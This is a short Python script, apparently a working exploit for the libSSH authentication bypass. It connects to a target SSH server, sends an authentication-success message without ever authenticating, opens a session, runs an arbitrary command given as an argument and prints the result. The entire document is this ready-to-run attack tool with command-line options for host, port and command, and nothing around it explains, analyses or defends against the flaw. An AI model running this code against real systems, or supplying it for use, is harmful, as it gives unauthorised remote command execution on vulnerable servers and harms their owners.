#!/usr/bin/python3

import time
import paramiko
import socket
import sys
import argparse

parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-c', '--command', help='Command')
args = parser.parse_args()


sock = socket.socket()
try:
    host = args.host;
    port = args.port
    command = args.command;
    sock.connect((host,int(port)))
    message = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)
    transport.start_client()
    message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
    transport._send_message(message)
    cmd = transport.open_session()
    cmd.exec_command(command)
    out=cmd.makefile("rb",222048)
    output=out.read()
    out.close()
    print (output)

except socket.error:
    print("Couldn't Connect to the Server")
    sys.exit(1)
